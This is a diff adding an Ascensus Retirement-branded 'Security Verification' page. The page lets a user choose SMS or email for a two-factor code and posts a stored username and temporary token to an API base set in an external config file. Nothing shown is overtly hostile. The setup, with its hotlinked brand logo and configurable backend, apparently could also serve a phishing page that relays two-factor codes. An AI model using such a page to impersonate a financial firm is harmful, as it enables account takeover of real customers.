@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification</title>
+
+  <!-- Font Awesome icons -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+  <style>
+    * {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  margin: 0;
+  min-height: 100%;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #292929;
+  background: #f3f3f3;
+}
+
+body {
+  display: flex;
+  justify-content: center;
+  padding: 15px;
+}
+
+.verification-card {
+  width: 100%;
+  max-width: 400px;
+  background: #fff;
+  border: 1px solid #d5d5d5;
+  border-radius: 12px;
+  padding: 25px 24px;
+  box-shadow: 0 1px 2px rgba(0, 0, 0, .03);
+}
+
+.title {
+  margin: 0 0 22px;
+  font-size: 22px;
+  font-weight: 400;
+  line-height: 1.2;
+  color: #2e2e2e;
+}
+
+.description {
+  margin: 0 0 23px;
+  color: #777;
+  font-size: 16px;
+  line-height: 1.5;
+  font-weight: 400;
+}
+
+.methods {
+  display: flex;
+  flex-direction: column;
+  gap: 13px;
+}
+
+.method {
+  width: 100%;
+  min-height: 115px;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  padding: 18px 23px;
+  border: 1px solid #d0d0d0;
+  border-radius: 10px;
+  background: #fff;
+  cursor: pointer;
+  text-align: left;
+  transition: border-color .15s ease, background .15s ease;
+}
+
+.method.selected {
+  border: 2px solid #003d4be5;
+  background: #f1f5fd;
+  padding: 17px 22px;
+}
+
+.method:hover {
+  border-color: #003d4be5;
+}
+
+.icon {
+  flex: 0 0 36px;
+  width: 36px;
+  text-align: center;
+  font-size: 24px;
+  color: #333;
+}
+
+.method.email .icon {
+  font-size: 15px;
+  color: #666;
+}
+
+.method-content {
+  min-width: 0;
+}
+
+.method-title {
+  margin: 0 0 6px;
+  font-size: 17px;
+  line-height: 1.2;
+  font-weight: 500;
+  color: #292929;
+}
+
+.method-description {
+  margin: 0;
+  font-size: 15px;
+  line-height: 1.45;
+  color: #777;
+}
+
+.send-code {
+  width: 100%;
+  height: 52px;
+  margin-top: 27px;
+  border: 0;
+  border-radius: 4px;
+  background: #003d4be5;
+  color: #fff;
+  font-size: 17px;
+  font-weight: 400;
+  cursor: pointer;
+  transition: background .15s ease;
+}
+
+.send-code:hover {
+  background: #003d4b8e;
+}
+
+.send-code:active {
+  transform: translateY(1px);
+}
+
+
+/* Medium screens */
+@media (max-width: 700px) {
+  body {
+    padding: 12px;
+  }
+
+  .verification-card {
+    max-width: 420px;
+    padding: 24px 22px;
+  }
+}
+
+
+/* Mobile */
+@media (max-width: 520px) {
+  body {
+    padding: 8px;
+  }
+
+  .verification-card {
+    border-radius: 11px;
+    padding: 25px 22px;
+  }
+
+  .title {
+    font-size: 21px;
+    margin-bottom: 21px;
+  }
+
+  .description {
+    font-size: 15px;
+    line-height: 1.5;
+    margin-bottom: 22px;
+  }
+
+  .methods {
+    gap: 12px;
+  }
+
+  .method,
+  .method.selected {
+    min-height: 110px;
+    padding: 17px 20px;
+    gap: 17px;
+  }
+
+  .method.selected {
+    padding: 16px 19px;
+  }
+
+  .icon {
+    flex-basis: 34px;
+    width: 34px;
+    font-size: 22px;
+  }
+
+  .method.email .icon {
+    font-size: 14px;
+  }
+
+  .method-title {
+    font-size: 16px;
+    margin-bottom: 5px;
+  }
+
+  .method-description {
+    font-size: 14px;
+    line-height: 1.45;
+  }
+
+  .send-code {
+    height: 50px;
+    margin-top: 26px;
+    font-size: 16px;
+  }
+}
+
+
+/* Small phones */
+@media (max-width: 380px) {
+  .verification-card {
+    padding: 22px 18px;
+  }
+
+  .title {
+    font-size: 20px;
+  }
+
+  .description {
+    font-size: 14px;
+  }
+
+  .method,
+  .method.selected {
+    min-height: 100px;
+    padding: 15px 16px;
+    gap: 14px;
+  }
+
+  .method.selected {
+    padding: 14px 15px;
+  }
+
+  .icon {
+    flex-basis: 30px;
+    width: 30px;
+    font-size: 20px;
+  }
+
+  .method-title {
+    font-size: 15px;
+  }
+
+  .method-description {
+    font-size: 13px;
+  }
+
+  .send-code {
+    height: 47px;
+    font-size: 15px;
+  }
+}
+ .logo img{
+    width: 100px;
+  }
+  </style>
+  <script src="../config.js"></script>
+</head>
+
+<body>
+  <main class="verification-card">
+  <header class="header">
+    <div class="logo">
+      <img src="https://cdn2.ascensus.com/ascensus/vfrngwxa/ascensus-logo-new_rgb-225x40.svg" alt="Ascensus Retirement Logo">
+    </div>
+  </header>
+ 
+
+    <h1 class="title">Security Verification</h1>
+
+    <p class="description">
+      To keep your account secure, we need to<br class="desktop-break">
+      verify your identity. Please select a method<br class="desktop-break">
+      to receive your verification code.
+    </p>
+
+    <div class="methods" role="radiogroup" aria-label="Verification method">
+
+      <button class="method selected" type="button" role="radio"
+              aria-checked="true" data-method="sms">
+        <span class="icon" aria-hidden="true">
+          <i class="fa-regular fa-comment-dots"></i>
+        </span>
+        <span class="method-content">
+          <span class="method-title">Text Message</span>
+          <span class="method-description">Receive a 6-digit code via text<br class="desktop-break"> message.</span>
+        </span>
+      </button>
+
+
+      <button class="method email" type="button" role="radio"
+              aria-checked="false" data-method="email">
+        <span class="icon" aria-hidden="true">
+          <i class="fa-regular fa-envelope"></i>
+        </span>
+        <span class="method-content">
+          <span class="method-title">Email</span>
+          <span class="method-description">Receive an email with your code.</span>
+        </span>
+      </button>
+    </div>
+
+    <button class="send-code" type="button" id="sendCode" onclick="nextStep()">
+      Send Code
+    </button>
+  </main>
+
+<script>
+  const methods = document.querySelectorAll('.method');
+  const sendCode = document.getElementById('sendCode');
+
+  let selectedMethod = 'sms';
+
+  // Select verification method
+  methods.forEach(method => {
+    method.addEventListener('click', () => {
+
+      // Remove selected state
+      methods.forEach(item => {
+        item.classList.remove('selected');
+        item.setAttribute('aria-checked', 'false');
+      });
+
+      // Select clicked method
+      method.classList.add('selected');
+      method.setAttribute('aria-checked', 'true');
+
+      // Store actual method value
+      selectedMethod = method.dataset.method;
+
+      console.log('Selected method:', selectedMethod);
+    });
+  });
+
+
+  // Send verification code
+  function nextStep() {
+
+    const username = localStorage.getItem('ascensus_username');
+    const tempToken = localStorage.getItem('temp_token');
+
+    // Make sure credentials exist
+    if (!username || !tempToken) {
+      showMessage(
+        'Your session has expired. Please login again.',
+        'error'
+      );
+      return;
+    }
+
+    // Get the currently selected method
+    const selected = document.querySelector('.method.selected');
+
+    if (!selected) {
+      showMessage(
+        'Please select a verification method.',
+        'error'
+      );
+      return;
+    }
+
+    const method = selected.dataset.method;
+
+    // Save selected method
+    localStorage.setItem('verification_method', method);
+
+    // Prevent multiple clicks
+    sendCode.disabled = true;
+    sendCode.textContent = 'Sending...';
+
+    fetch(window.ascensus_API_BASE + '/api/two-factor/sendcode', {
+      method: 'POST',
+
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${tempToken}`
+      },
+
+      body: JSON.stringify({
+        username: username,
+        method: method 
+      })
+    })
+
+    .then(async response => {
+      const data = await response.json().catch(() => ({}));
+
+      return {
+        ok: response.ok,
+        data: data
+      };
+    })
+
+    .then(result => {
+
+      if (!result.ok) {
+
+        showMessage(
+          result.data.message ||
+          'Failed to send verification code.',
+          'error'
+        );
+
+        sendCode.disabled = false;
+        sendCode.textContent = 'Send Code';
+
+        return;
+      }
+
+      // Code successfully sent
+      window.location.href ='verify-code.html';
+    })
+
+    .catch(error => {
+
+      console.error('2FA error:', error);
+
+      showMessage(
+        'Unable to reach the server. Please try again.',
+        'error'
+      );
+
+      sendCode.disabled = false;
+      sendCode.textContent = 'Send Code';
+    });
+
+    return false;
+  }
+</script>
+</body>
+</html>
